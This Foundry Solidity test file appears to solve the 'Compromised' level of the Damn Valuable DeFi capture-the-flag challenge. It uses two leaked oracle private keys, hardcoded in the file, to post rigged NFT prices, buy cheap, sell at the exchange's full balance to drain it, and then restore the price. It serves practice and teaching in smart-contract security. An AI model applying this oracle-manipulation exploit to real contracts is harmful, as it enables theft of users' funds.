// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import { Utilities } from "./Utilities.sol";
import { Exchange, TrustfulOracle, DamnValuableNFT } from "../src/compromised/Exchange.sol";
import { TrustfulOracleInitializer } from "../src/compromised/TrustfulOracleInitializer.sol";


contract ExchangeTest is Test{
    uint256 internal constant EXCHANGE_INITIAL_ETH_BALANCE = 999e18;
    uint256 internal constant TRUSTED_SOURCE_INITIAL_ETH_BALANCE = 2e18;
    uint256 internal constant PLAYER_INITIAL_ETH_BALANCE = 1e17;
    uint256 internal constant INITIAL_NFT_PRICE = 999e18;

    Utilities util = new Utilities();
    TrustfulOracle oracle;
    Exchange exchange;
    DamnValuableNFT nftToken;

    address[] sources = [
        0xA73209FB1a42495120166736362A1DfA9F95A105, 
        0xe92401A4d3af5E446d93D11EEc806b1462b39D15,
        0x81A5D6E50C214044bE44cA0CB057fe119097850c
        ];

    address deployer;
    address player;

    address oracle1;
    address oracle2;

    uint256[] internal initialPrices;

    function setUp() public{
        address payable[] memory users = util.createUsers(2);
        deployer = users[0];
        player = users[1];
        for (uint256 i=0; i < sources.length; i++){
            vm.deal(sources[i], TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
            assertEq(sources[i].balance, TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
        }

        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);

        string[] memory symbols = new string[](3);
        //uint256[] memory initialPrices = new uint256[](3);
        initialPrices = new uint256[](3);

        for (uint256 i = 0; i < 3; i++) {
            symbols[i] = 'DVNFT';
            initialPrices[i] = INITIAL_NFT_PRICE;
        }

        TrustfulOracleInitializer initializer = new TrustfulOracleInitializer(sources, symbols, initialPrices);
        oracle = TrustfulOracle(initializer.oracle());
        exchange = new Exchange{value: EXCHANGE_INITIAL_ETH_BALANCE}(address(oracle));
        nftToken = DamnValuableNFT(exchange.token());
    }

    function testExploit() public{
        oracle1 = vm.addr(0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9);
        oracle2 = vm.addr(0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48);

        // `postPrice` posts the price of 2 NFTs, once from EACH oracle.
        // This guarentees one of the cheap prices will be the median because there are 3 NFTs total
        postPrice(0.0001 ether);

        // Console logs
        console.log("Initial balance of the player: ", address(player).balance);
        console.log("Initial balance of the pool: ", address(exchange).balance);
        for (uint256 i = 0; i < 3; i++) {console.log("Initial Price of NFT", i+1, "is:", initialPrices[0]);}
        
        vm.startPrank(player);
        uint256 id = exchange.buyOne{value: 0.0001 ether}();
        vm.stopPrank();

        // Console logs
        uint256[] memory prices = oracle.getAllPricesForSymbol("DVNFT");
        for (uint256 i = 0; i < prices.length; i++) {console.log("Price of NFT", i+1, "after cheap purchase is:", prices[i]);}
        
        uint256 exchangeBalance = address(exchange).balance;
        postPrice(exchangeBalance);

        //Console logs
        uint256[] memory prices2 = oracle.getAllPricesForSymbol("DVNFT");
        for (uint256 i = 0; i < prices2.length; i++) {console.log("Price of NFT", i+1, "after expensive listing is:", prices2[i]);}
        
        vm.startPrank(player);
        nftToken.approve(address(exchange), id);
        exchange.sellOne(id);
        vm.stopPrank();

        postPrice(INITIAL_NFT_PRICE);

        //Console logs
        uint256[] memory pricesFinal = oracle.getAllPricesForSymbol("DVNFT");
        for (uint256 i = 0; i < pricesFinal.length; i++) {console.log("Final Price of NFT", i+1, "is:", pricesFinal[i]);}
        console.log("Balance of the player, Final: ", address(player).balance);
        console.log("Balance of the pool, Final: ", address(exchange).balance);
        
        validation();
    }

    function postPrice(uint256 price) public {
        vm.startPrank(oracle1);
        oracle.postPrice('DVNFT', price);
        vm.stopPrank();
        vm.startPrank(oracle2);
        oracle.postPrice('DVNFT', price);
        vm.stopPrank();
    }

    function validation() public{
        assertEq(address(exchange).balance, 0);
        assertGt(address(player).balance, EXCHANGE_INITIAL_ETH_BALANCE);
        assertEq(nftToken.balanceOf(player), 0);
        assertEq(oracle.getMedianPrice('DVNFT'), INITIAL_NFT_PRICE);
        console.log(unicode"\n🎉🥳 Congratulations, you beat the level!!! 🥳🎉");
    }

}